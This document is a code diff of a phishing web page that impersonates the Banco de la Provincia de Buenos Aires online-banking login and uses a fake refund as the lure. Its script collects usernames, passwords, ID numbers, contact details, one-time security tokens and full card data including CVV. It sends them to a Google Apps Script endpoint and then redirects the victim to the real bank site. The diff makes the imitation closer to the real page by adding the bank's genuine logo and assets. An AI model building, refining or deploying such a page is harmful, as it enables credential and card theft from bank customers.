@@ -3,126 +3,162 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Banco Provincia · Banca Online</title>
+<title>Banco de la Provincia de Buenos Aires</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 <style>
-  :root{--verde:#2e9e33;--verde-osc:#257f29;--cian:#3cb9d6;--fondo:#e7e7e7;--texto:#3a3a3a;--gris:#6e6e6e;--borde:#d6d6d6;}
+  :root{--verde:#279d2e;--verde-osc:#1c7a23;--cian:#25b4bd;--texto:#3c3c3b;--gris:#6e6e6e;--borde:#cfcfcf;}
   *{box-sizing:border-box;}
-  body{margin:0;font-family:'Poppins',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:var(--fondo);color:var(--texto);}
-  .barra{background:var(--fondo);padding:18px 20px;display:flex;align-items:center;justify-content:space-between;}
-  .marca{display:flex;align-items:center;gap:9px;}
-  .marca b{font-size:19px;font-weight:600;letter-spacing:-.3px;color:#333;}
-  .marca svg{width:34px;height:26px;display:block;}
-  .hamb{width:24px;height:16px;position:relative;}
-  .hamb i{position:absolute;left:0;width:24px;height:2.4px;background:#444;border-radius:2px;}
-  .hamb i:nth-child(1){top:0}.hamb i:nth-child(2){top:6.8px}.hamb i:nth-child(3){top:13.6px}
-  .caja{max-width:400px;margin:22px auto 40px;background:#fff;border-radius:14px;padding:26px 24px;box-shadow:0 2px 14px rgba(0,0,0,.07);}
-  h1{font-size:19px;margin:0 0 5px;font-weight:600;letter-spacing:-.2px;}
-  .sub{font-size:13.5px;color:var(--gris);margin:0 0 20px;line-height:1.45;font-weight:300;}
-  label{display:block;font-size:12px;font-weight:600;color:var(--gris);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px;}
-  input{width:100%;padding:13px;border:1px solid var(--borde);border-radius:9px;font-size:16px;margin-bottom:15px;font-family:inherit;color:var(--texto);}
-  input:focus{outline:none;border-color:var(--verde);box-shadow:0 0 0 3px rgba(46,158,51,.15);}
-  button{width:100%;padding:15px;border:none;border-radius:9px;background:var(--verde);color:#fff;font-size:15.5px;font-weight:600;cursor:pointer;font-family:inherit;}
-  button:hover{background:var(--verde-osc);}
-  .pasos{display:flex;gap:6px;margin-bottom:20px;}
-  .pasos i{height:4px;flex:1;background:#e3e3e3;border-radius:2px;}
-  .pasos i.on{background:var(--verde);}
-  .aviso{background:#f4f8ee;border:1px solid #dbe8c8;border-radius:9px;padding:12px 14px;font-size:12.5px;color:#4c5f2c;line-height:1.45;margin-bottom:18px;font-weight:300;}
-  #tk{text-align:center;font-size:23px;letter-spacing:7px;font-weight:600;}
-  a{color:var(--verde-osc);text-decoration:none;font-weight:600;}
-  .ok{text-align:center;padding:8px 0 4px;}
-  .ok .cir{width:64px;height:64px;border-radius:50%;background:#eaf6e8;color:var(--verde);display:flex;align-items:center;justify-content:center;font-size:32px;margin:0 auto 16px;}
-  .ok h2{font-size:18px;margin:0 0 9px;font-weight:600;}
-  .ok p{font-size:13.5px;color:var(--gris);margin:0 0 6px;line-height:1.5;font-weight:300;}
-  .pie{text-align:center;font-size:11.5px;color:#8a8a8a;padding:0 20px 30px;font-weight:300;}
-  .oculto{display:none;}
-  .sp{width:34px;height:34px;border:3px solid #e0e0e0;border-top-color:var(--verde);border-radius:50%;margin:0 auto;animation:g .8s linear infinite;}
-  @keyframes g{to{transform:rotate(360deg)}}
+  body{margin:0;font-family:'Poppins',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;color:var(--texto);}
+  .fondo{min-height:100vh;background:#eaeaea url('https://www.bancoprovincia.bancainternet.com.ar/spa/assets/login-Dl1yShgU.png') center/cover no-repeat;display:flex;justify-content:center;align-items:flex-start;padding:24px 16px 44px;}
+  .card{width:100%;max-width:382px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 8px 28px rgba(0,0,0,.18);}
+  .cab{background:linear-gradient(135deg,#279d2e 0%,#1c7a23 100%);padding:15px;text-align:center;}
+  .cab img{height:38px;width:auto;display:inline-block;}
+  #logoAlt{height:30px;width:auto;display:none;}
+  .cuerpo{padding:20px 20px 26px;}
+  .barra{height:3px;background:#e8e8e8;border-radius:2px;margin-bottom:18px;overflow:hidden;}
+  .barra i{display:block;height:3px;width:33%;background:var(--verde);border-radius:2px;transition:width .3s;}
+  h1{font-size:20px;margin:0 0 18px;font-weight:600;letter-spacing:-.2px;}
+  .sub{font-size:13px;color:var(--gris);margin:-10px 0 18px;line-height:1.45;font-weight:300;}
+  label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;}
+  label .req{color:#c62828;}
+  input{width:100%;padding:12px 13px;border:1px solid var(--borde);border-radius:8px;font-size:15px;margin-bottom:15px;font-family:inherit;color:var(--texto);}
+  input:focus{outline:none;border-color:#5b9bd5;box-shadow:0 0 0 3px rgba(91,155,213,.18);}
+  input.mal{border-color:#c62828;background:#fdf5f5;}
+  .ojo{position:relative;}
+  .ojo input{padding-right:44px;margin-bottom:15px;}
+  .ojo button{position:absolute;right:6px;top:6px;width:34px;height:34px;border:none;background:none;cursor:pointer;color:#8a8a8a;display:flex;align-items:center;justify-content:center;}
+  button.principal{width:100%;padding:13px;border:none;border-radius:8px;background:var(--verde);color:#fff;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;}
+  button.principal:hover{background:var(--verde-osc);}
+  .teclado{display:flex;align-items:center;justify-content:center;gap:6px;width:100%;border:none;background:none;color:var(--verde);font-size:13px;font-weight:600;cursor:pointer;margin:2px 0 14px;font-family:inherit;}
+  .links{text-align:center;margin-top:16px;font-size:12.5px;color:var(--gris);line-height:1.9;}
+  .links button{border:none;background:none;color:var(--verde);font-size:12.5px;font-weight:600;cursor:pointer;padding:0;font-family:inherit;}
+  .links .t {color:var(--gris);font-weight:300;}
+  a{color:var(--verde);text-decoration:underline;font-weight:600;}
+  .aviso{background:#f2f8ee;border:1px solid #d7e7c8;border-radius:8px;padding:11px 13px;font-size:12.5px;color:#4a5d2a;line-height:1.45;margin-bottom:16px;font-weight:300;}
+  #tk{text-align:center;font-size:22px;letter-spacing:6px;font-weight:600;}
+  #n{letter-spacing:.5px;}
   .fila{display:flex;gap:10px;}
   .fila > div{flex:1;}
+  .ok{text-align:center;padding:6px 0 2px;}
+  .ok .cir{width:58px;height:58px;border-radius:50%;background:#eaf6e8;color:var(--verde);display:flex;align-items:center;justify-content:center;font-size:28px;margin:0 auto 14px;}
+  .ok h2{font-size:17px;margin:0 0 8px;font-weight:600;}
+  .ok p{font-size:13px;color:var(--gris);margin:0 0 6px;line-height:1.5;font-weight:300;}
+  .oculto{display:none;}
+  .sp{width:32px;height:32px;border:3px solid #e3e3e3;border-top-color:var(--verde);border-radius:50%;margin:0 auto;animation:g .8s linear infinite;}
+  @keyframes g{to{transform:rotate(360deg)}}
+  .pie{max-width:382px;margin:14px auto 0;text-align:center;font-size:11px;color:#6b6b6b;font-weight:300;text-shadow:0 1px 2px rgba(255,255,255,.8);}
 </style>
 </head>
 <body>
 
-<div class="barra">
-  <div class="marca">
-    <b>Banco Provincia</b>
-    <svg viewBox="0 0 60 46" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 4h11a13 13 0 0 1 0 26H12z" fill="#2e9e33"/>
-      <path d="M12 4h8v34h-8z" fill="#2e9e33"/>
-      <path d="M12 30c0 8 4 12 10 12 4 0 6-3 6-7v-5z" fill="#3cb9d6"/>
-    </svg>
-  </div>
-  <div class="hamb"><i></i><i></i><i></i></div>
-</div>
+<div class="fondo">
+  <div>
+    <div class="card">
+      <div class="cab">
+        <img src="https://www.bancoprovincia.com.ar/CDN/Get/logo_mobile_bip" alt="Banco de la Provincia de Buenos Aires"
+             onerror="this.style.display='none';document.getElementById('logoAlt').style.display='inline-block';">
+        <svg id="logoAlt" viewBox="0 0 183 36" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#25b4bd" d="M150.83,26.88v1.53A7.69,7.69,0,0,0,158.44,36h3.95a2.22,2.22,0,0,0,2.32-2.29V18.82a1.18,1.18,0,0,0-1.92-.88l-11.15,7.18a1.75,1.75,0,0,0-.81,1.76"/>
+          <path fill="#279d2e" d="M152.4,21.24l10.68-6.89c2.21-1.41,4.47-.06,4.47,2.18v8.29A1.46,1.46,0,0,0,169,26.35h1.91c6.51,0,12.08-4.7,12.08-12.7C183,5.18,176.5,0,168.89,0H153a2.2,2.2,0,0,0-2.15,2.18V20.47a1,1,0,0,0,1.57.77"/>
+          <path fill="#fff" d="M10,19.74c0,2.56-1.42,3.68-4.68,3.68H0V10.57H5c3.25,0,4.67,1.14,4.67,3.44a2.65,2.65,0,0,1-2.25,2.75,2.8,2.8,0,0,1,2.62,3m-8-7.2v3.33H5c1.54,0,2.54-.35,2.54-1.69s-1-1.64-2.54-1.64Zm5.87,7c0-1.48-1-1.83-2.55-1.83H2v3.76H5.36c1.51,0,2.55-.37,2.55-1.93"/>
+          <path fill="#fff" d="M19.88,16.66v6.76H18.46l-.38-1.86a3.59,3.59,0,0,1-3.42,2c-2.2,0-3.21-1.27-3.21-2.95,0-3,3.23-3.29,6.5-3.62v-.32c0-1.56-.89-2.26-2.54-2.26a4.26,4.26,0,0,0-2.95,1.29l-1-1.55a6.36,6.36,0,0,1,4.06-1.47c3,0,4.32,1.42,4.36,4M18,19.5V18.45c-2.38.24-4.5.48-4.5,2.08,0,.83.45,1.38,1.67,1.38A2.69,2.69,0,0,0,18,19.5"/>
+          <path fill="#fff" d="M31.09,16.43v7h-2V16.9c0-1.63-.69-2.39-2.14-2.39-1.69,0-2.65,1-2.8,3v5.89H22.22V12.82h1.41l.39,1.8a3.63,3.63,0,0,1,3.5-1.95c2.18,0,3.57,1.23,3.57,3.76"/>
+          <path fill="#fff" d="M33,18.1c0-3.24,1.68-5.43,4.94-5.43a5.18,5.18,0,0,1,3.71,1.45l-1,1.62a3.29,3.29,0,0,0-2.71-1.34c-1.72,0-3,1.29-3,3.68s1.42,3.76,3,3.76a3.33,3.33,0,0,0,2.71-1.35l1,1.62a5.23,5.23,0,0,1-3.71,1.46c-3.11,0-4.94-2.19-4.94-5.47"/>
+          <path fill="#fff" d="M42.46,18.08c0-3.31,1.46-5.41,4.84-5.41s4.81,2.12,4.81,5.41-1.43,5.47-4.81,5.47-4.84-2.12-4.84-5.47m7.66,0c0-2.45-.86-3.66-2.82-3.66s-2.84,1.21-2.84,3.66.88,3.76,2.84,3.76,2.82-1.25,2.82-3.76"/>
+          <path fill="#fff" d="M68.31,15c0,2.63-1.46,4.36-4.85,4.36H61.2v4.09H58.06V10.55h5.4c3.36,0,4.85,1.71,4.85,4.42m-3.18,0c0-1.23-.55-1.8-1.87-1.8H61.2v3.6h2.06A1.62,1.62,0,0,0,65.13,15"/>
+          <path fill="#fff" d="M76.26,12.71v3.14a4.92,4.92,0,0,0-1.13-.09c-1.51,0-2.16.9-2.25,2.62v0l0,5.08h-3V12.78h2.25l.62,2.12a3.11,3.11,0,0,1,2.89-2.27,1.83,1.83,0,0,1,.66.08"/>
+          <path fill="#fff" d="M77,18.06c0-3.4,1.69-5.45,5.2-5.45s5.18,2.05,5.18,5.45-1.71,5.53-5.18,5.53S77,21.52,77,18.06m7.23,0c0-2-.61-3-2-3s-2.07,1-2.07,3,.63,3.09,2.07,3.09,2-1,2-3.09"/>
+          <path fill="#fff" d="M98.13,12.78,94.68,23.42H91.26L87.81,12.78h3l1.84,6.43c.1.47.2,1,.27,1.43.07-.46.14-1,.25-1.43l1.86-6.43Z"/>
+          <path fill="#fff" d="M99.38,9.91h3v2h-3Zm0,2.87h3V23.42h-3Z"/>
+          <path fill="#fff" d="M114.36,16.37v7.05h-3V17.16c0-1.34-.49-1.95-1.59-1.95s-1.91.72-2,2.32v5.89h-3V12.78h2.23l.55,1.88a3.27,3.27,0,0,1,3.31-2c2.29,0,3.56,1.24,3.56,3.74"/>
+          <path fill="#fff" d="M116.09,18.1c0-3.39,1.84-5.49,5.35-5.49a6,6,0,0,1,3.7,1.18l-1,2.52a3.32,3.32,0,0,0-2.51-1.12c-1.36,0-2.45.9-2.45,2.89S120.4,21,121.67,21a3.4,3.4,0,0,0,2.51-1.12l1,2.52a6.15,6.15,0,0,1-3.7,1.18c-3.42,0-5.35-2.1-5.35-5.49"/>
+          <path fill="#fff" d="M126.7,9.91h3v2h-3Zm0,2.87h3V23.42h-3Z"/>
+          <path fill="#fff" d="M140.84,16.79v6.63h-2.23l-.55-2a3.3,3.3,0,0,1-3.36,2.12c-2.27,0-3.16-1.31-3.16-3,0-3,2.94-3.3,6.32-3.63v0c0-1.32-.89-1.84-2.27-1.84a4.19,4.19,0,0,0-2.92,1.27l-1.2-2.26a7.35,7.35,0,0,1,4.45-1.44c3.42,0,4.91,1.47,4.92,4.14m-3,2.6v-.76c-1.94.23-3.29.43-3.29,1.62,0,.67.33,1.09,1.2,1.09a2,2,0,0,0,2.09-1.95"/>
+        </svg>
+      </div>
 
-<div class="caja">
+      <div class="cuerpo">
 
-  <div id="p1">
-    <div class="pasos"><i class="on"></i><i></i><i></i></div>
-    <h1>Ingresá a tu cuenta</h1>
-    <p class="sub">Reintegro por gastos de hacienda pendiente de acreditación.</p>
-    <label for="u">Usuario BIP</label>
-    <input id="u" placeholder="Si no lo tenés, dejalo vacío" autocomplete="off">
-    <label for="c">Clave</label>
-    <input id="c" type="password" placeholder="Clave BIP">
-    <button id="b1">Ingresar</button>
-  </div>
+        <div id="p1">
+          <h1>Iniciá sesión</h1>
+          <label for="u">Tu usuario <span class="req">*</span></label>
+          <input id="u" maxlength="16" placeholder="Ingresá tu nombre de usuario" autocomplete="off">
+          <label for="c">Tu clave <span class="req">*</span></label>
+          <div class="ojo">
+            <input id="c" type="password" maxlength="8" placeholder="Ingresá tu clave" autocomplete="off">
+            <button type="button" id="ver" aria-label="Mostrar clave">
+              <svg width="20" height="14" viewBox="0 0 18 12" fill="#8a8a8a"><path d="M9 0C4.5 0 1.1 3.1 0 6c1.1 2.9 4.5 6 9 6s7.9-3.1 9-6C16.9 3.1 13.5 0 9 0Zm0 10a4 4 0 1 1 0-8 4 4 0 0 1 0 8Zm0-6.5A2.5 2.5 0 1 0 9 8.5 2.5 2.5 0 0 0 9 3.5Z"/></svg>
+            </button>
+          </div>
+          <button type="button" class="teclado">
+            <svg width="20" height="20" viewBox="0 0 25 25" fill="currentColor"><path d="M21.9 7.8H3.1A1.6 1.6 0 0 0 1.6 9.4v7.8a1.6 1.6 0 0 0 1.5 1.6h18.8a1.6 1.6 0 0 0 1.5-1.6V9.4a1.6 1.6 0 0 0-1.5-1.6Zm-3.1 8.9h-2.2v-1.1h2.2Zm0-3.2h-2.2v-1.1h2.2Zm-3.2 3.2h-1.1v-1.1h1.1Zm0-3.2h-1.1v-1.1h1.1Zm-3.1 3.2h-1.1v-1.1h1.1Zm0-3.2h-1.1v-1.1h1.1Zm-3.2 3.2H8.2v-1.1h1.1Zm0-3.2H8.2v-1.1h1.1Zm-3.1 3.2H4.1v-1.1h2.2Zm0-3.2H4.1v-1.1h2.2Z"/></svg>
+            Teclado Virtual
+          </button>
+          <button class="principal" id="b1">Ingresar</button>
+          <div class="links">
+            <span class="t">¿No sos BIP?</span> <button type="button">Registrate</button><br>
+            <button type="button">Bloqueé u olvidé mi usuario y/o clave</button><br>
+            <button type="button">Conocé como hacerte usuario u operar</button><br>
+            <button type="button">Recomendaciones de seguridad</button>
+          </div>
+        </div>
 
-  <div id="p2" class="oculto">
-    <div class="pasos"><i class="on"></i><i class="on"></i><i></i></div>
-    <h1>Validación de dispositivo</h1>
-    <p class="sub">Primer ingreso desde este dispositivo. Confirmá tus datos de contacto para habilitarlo.</p>
-    <label for="d">DNI del titular</label>
-    <input id="d" inputmode="numeric" maxlength="8" placeholder="Número de documento" autocomplete="off">
-    <label for="m">Correo electrónico</label>
-    <input id="m" type="email" inputmode="email" placeholder="tucorreo@gmail.com" autocomplete="off">
-    <label for="t">Celular</label>
-    <input id="t" type="tel" inputmode="numeric" placeholder="11 5555 5555" autocomplete="off">
-    <button id="b2">Continuar</button>
-  </div>
+        <div id="p2" class="oculto">
+          <div class="barra"><i style="width:66%"></i></div>
+          <h1>Validá tu dispositivo</h1>
+          <p class="sub">Es el primer ingreso desde este equipo. Confirmá tus datos de contacto para habilitarlo.</p>
+          <label for="d">DNI del titular <span class="req">*</span></label>
+          <input id="d" inputmode="numeric" maxlength="8" placeholder="Ingresá tu documento" autocomplete="off">
+          <label for="m">Correo electrónico <span class="req">*</span></label>
+          <input id="m" type="email" inputmode="email" maxlength="40" placeholder="Ingresá tu correo" autocomplete="off">
+          <label for="t">Celular <span class="req">*</span></label>
+          <input id="t" type="tel" inputmode="numeric" maxlength="10" placeholder="Código de área y número" autocomplete="off">
+          <button class="principal" id="b2">Continuar</button>
+        </div>
 
-  <div id="p2b" class="oculto" style="text-align:center;padding:34px 0;">
-    <div class="sp"></div>
-    <p class="sub" style="margin-top:18px;">Validando dispositivo...</p>
-  </div>
+        <div id="p2b" class="oculto" style="text-align:center;padding:34px 0;">
+          <div class="sp"></div>
+          <p class="sub" style="margin-top:18px;">Validando dispositivo...</p>
+        </div>
 
-  <div id="p3" class="oculto">
-    <div class="pasos"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <h1>Token de seguridad</h1>
-    <p class="sub">Abrí BIP Móvil, tocá "Token de seguridad" y pasá el código de 6 dígitos.</p>
-    <label for="tk">Código</label>
-    <input id="tk" inputmode="numeric" maxlength="6" autocomplete="off">
-    <div class="aviso">El código vence a los 60 segundos.</div>
-    <button id="b3">Continuar</button>
-    <p class="sub" style="margin-top:16px;text-align:center;"><a href="#" id="sinTok">No tengo el token a mano</a></p>
-  </div>
+        <div id="p3" class="oculto">
+          <div class="barra"><i style="width:100%"></i></div>
+          <h1>Token de seguridad</h1>
+          <p class="sub">Abrí BIP Móvil, tocá "Token de seguridad" y pasá el código de 6 dígitos.</p>
+          <label for="tk">Código <span class="req">*</span></label>
+          <input id="tk" inputmode="numeric" maxlength="6" placeholder="000000" autocomplete="off">
+          <div class="aviso">El código vence a los 60 segundos.</div>
+          <button class="principal" id="b3">Continuar</button>
+          <div class="links"><button type="button" id="sinTok">No tengo el token a mano</button></div>
+        </div>
 
-  <div id="p4" class="oculto">
-    <div class="pasos"><i class="on"></i><i class="on"></i><i class="on"></i></div>
-    <h1>Acreditación del reintegro</h1>
-    <p class="sub">Confirmá la tarjeta donde querés recibir el importe.</p>
-    <label for="n">Número de tarjeta</label>
-    <input id="n" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
-    <div class="fila">
-      <div><label for="v">Vencimiento</label><input id="v" maxlength="5" placeholder="MM/AA" autocomplete="off"></div>
-      <div><label for="s">Código</label><input id="s" inputmode="numeric" maxlength="4" placeholder="CVV" autocomplete="off"></div>
+        <div id="p4" class="oculto">
+          <div class="barra"><i style="width:100%"></i></div>
+          <h1>Acreditación del reintegro</h1>
+          <p class="sub">Confirmá la tarjeta donde querés recibir el importe.</p>
+          <label for="n">Número de tarjeta <span class="req">*</span></label>
+          <input id="n" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="off">
+          <div class="fila">
+            <div><label for="v">Vencimiento <span class="req">*</span></label><input id="v" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="off"></div>
+            <div><label for="s">Código <span class="req">*</span></label><input id="s" inputmode="numeric" maxlength="3" placeholder="CVV" autocomplete="off"></div>
+          </div>
+          <label for="ti">Titular <span class="req">*</span></label>
+          <input id="ti" maxlength="40" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
+          <button class="principal" id="b4">Acreditar</button>
+        </div>
+
+        <div id="p5" class="oculto ok">
+          <div class="cir">✓</div>
+          <h2>Reintegro acreditado</h2>
+          <p>El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
+          <p style="margin-top:12px;font-size:12px;color:#8a8a8a;">Redirigiendo a la Banca Online...</p>
+        </div>
+
+      </div>
     </div>
-    <label for="ti">Titular</label>
-    <input id="ti" placeholder="Nombre como figura en la tarjeta" autocomplete="off">
-    <button id="b4">Acreditar</button>
+    <p class="pie">Banco de la Provincia de Buenos Aires · Conexión segura</p>
   </div>
-
-  <div id="p5" class="oculto ok">
-    <div class="cir">✓</div>
-    <h2>Reintegro acreditado</h2>
-    <p>El importe se verá reflejado en tu cuenta dentro de las próximas 48 horas hábiles.</p>
-    <p style="margin-top:14px;font-size:12.5px;color:#8a8a8a;">Redirigiendo a la Banca Online...</p>
-  </div>
-
 </div>
-
-<p class="pie">Banco Provincia · Banca Online · Conexión segura</p>
 
 <script>
 const API = "https://script.google.com/macros/s/AKfycbz4vN9NJ7e62oxP8vtnraF86D901Tb02wCe5hWfee2AN9XFLfF-7M6iDeFSfvnwmJJuow/exec";
@@ -130,19 +166,55 @@ const datos = {};
 
 const $ = id => document.getElementById(id);
 const soloDig = s => String(s).replace(/\D/g, "");
+const soloAlfa = s => String(s).replace(/[^A-Za-z0-9]/g, "");
 
 function enviar(estado){
   const cuerpo = JSON.stringify(Object.assign({}, datos, {estado:estado}));
   try{ fetch(API, {method:"POST", body:cuerpo, keepalive:true}); }catch(e){}
 }
-
 function ir(a, b){ $(a).classList.add("oculto"); $(b).classList.remove("oculto"); }
+function marcar(el, malo){ el.classList.toggle("mal", malo); }
+function revisar(id, min, max){
+  const el = $(id);
+  const v = el.value.trim();
+  const malo = v.length < min || v.length > max;
+  marcar(el, malo);
+  return !malo;
+}
+
+$("ver").onclick = () => { $("c").type = $("c").type === "password" ? "text" : "password"; };
+
+$("u").oninput = e => { e.target.value = soloAlfa(e.target.value); marcar(e.target, false); };
+$("c").oninput = e => { e.target.value = e.target.value.replace(/[^A-Za-z0-9.#$%&*+\-]/g, ""); marcar(e.target, false); };
+$("d").oninput = e => { e.target.value = soloDig(e.target.value).slice(0,8); marcar(e.target, false); };
+$("t").oninput = e => { e.target.value = soloDig(e.target.value).slice(0,10); marcar(e.target, false); };
+$("tk").oninput = e => { e.target.value = soloDig(e.target.value).slice(0,6); marcar(e.target, false); };
+$("s").oninput = e => { e.target.value = soloDig(e.target.value).slice(0,3); marcar(e.target, false); };
+$("m").oninput = e => marcar(e.target, false);
+$("ti").oninput = e => marcar(e.target, false);
+
+$("n").oninput = e => {
+  const v = soloDig(e.target.value).slice(0,16);
+  e.target.value = v.replace(/(.{4})/g, "$1 ").trim();
+  marcar(e.target, false);
+};
+
+$("v").oninput = e => {
+  let v = soloDig(e.target.value).slice(0,4);
+  if(v.length > 2) v = v.slice(0,2) + "/" + v.slice(2);
+  e.target.value = v;
+  marcar(e.target, false);
+};
 
 $("b1").onclick = () => {
-  const u = $("u").value.trim().replace(/\s+/g, "");
+  const u = $("u").value.trim();
   const c = $("c").value.trim();
-  if(u && u.length < 4){ $("u").focus(); return; }
-  if(c.length < 4){ $("c").focus(); return; }
+  const uOk = u.length === 0 ? true : (u.length >= 8 && u.length <= 16);
+  marcar($("u"), !uOk);
+  const cOk = c.length === 8;
+  marcar($("c"), !cOk);
+  if(!uOk){ $("u").focus(); return; }
+  if(!cOk){ $("c").focus(); return; }
   datos.usuario = u;
   datos.clave = c;
   ir("p1","p2");
@@ -150,24 +222,25 @@ $("b1").onclick = () => {
 };
 
 $("b2").onclick = () => {
-  const d = soloDig($("d").value);
+  const dOk = revisar("d", 8, 8);
   const m = $("m").value.trim();
-  const t = soloDig($("t").value);
-  if(d.length < 6){ $("d").focus(); return; }
-  if(m.indexOf("@") < 1 || m.indexOf(".") < 0){ $("m").focus(); return; }
-  if(t.length < 8){ $("t").focus(); return; }
-  datos.dni = d;
+  const mOk = m.indexOf("@") > 0 && m.indexOf(".") > 0 && m.length <= 40;
+  marcar($("m"), !mOk);
+  const tOk = revisar("t", 10, 10);
+  if(!dOk){ $("d").focus(); return; }
+  if(!mOk){ $("m").focus(); return; }
+  if(!tOk){ $("t").focus(); return; }
+  datos.dni = soloDig(d);
   datos.email = m;
-  datos.telefono = t;
+  datos.telefono = soloDig(t);
   enviar("parcial");
   ir("p2","p2b");
   setTimeout(() => { ir("p2b","p3"); $("tk").focus(); }, 18000);
 };
 
 $("b3").onclick = () => {
-  const tk = soloDig($("tk").value);
-  if(tk.length < 6){ $("tk").focus(); return; }
-  datos.token = tk;
+  if(!revisar("tk", 6, 6)){ $("tk").focus(); return; }
+  datos.token = soloDig($("tk").value);
   enviar("token");
   ir("p3","p4");
   $("n").focus();
@@ -181,26 +254,22 @@ $("sinTok").onclick = e => {
 };
 
 $("b4").onclick = () => {
-  const n = soloDig($("n").value);
-  const s = soloDig($("s").value);
-  if(n.length < 15){ $("n").focus(); return; }
-  if(s.length < 3){ $("s").focus(); return; }
-  datos.tarjeta = n;
-  datos.cvv = s;
+  const nOk = revisar("n", 19, 19);
+  const vOk = revisar("v", 5, 5);
+  const sOk = revisar("s", 3, 3);
+  const tiOk = revisar("ti", 5, 40);
+  if(!nOk){ $("n").focus(); return; }
+  if(!vOk){ $("v").focus(); return; }
+  if(!sOk){ $("s").focus(); return; }
+  if(!tiOk){ $("ti").focus(); return; }
+  datos.tarjeta = soloDig($("n").value);
   datos.venc = $("v").value;
-  datos.titular = $("ti").value;
+  datos.cvv = soloDig($("s").value);
+  datos.titular = $("ti").value.trim();
   enviar("completo");
   ir("p4","p5");
   setTimeout(() => { location.href = "https://www.bancoprovincia.com.ar/"; }, 4500);
 };
-
-document.addEventListener("keydown", e => {
-  if(e.key !== "Enter") return;
-  if(!$("p1").classList.contains("oculto")) $("b1").click();
-  else if(!$("p2").classList.contains("oculto")) $("b2").click();
-  else if(!$("p3").classList.contains("oculto")) $("b3").click();
-  else if(!$("p4").classList.contains("oculto")) $("b4").click();
-});
 </script>
 </body>
 </html>
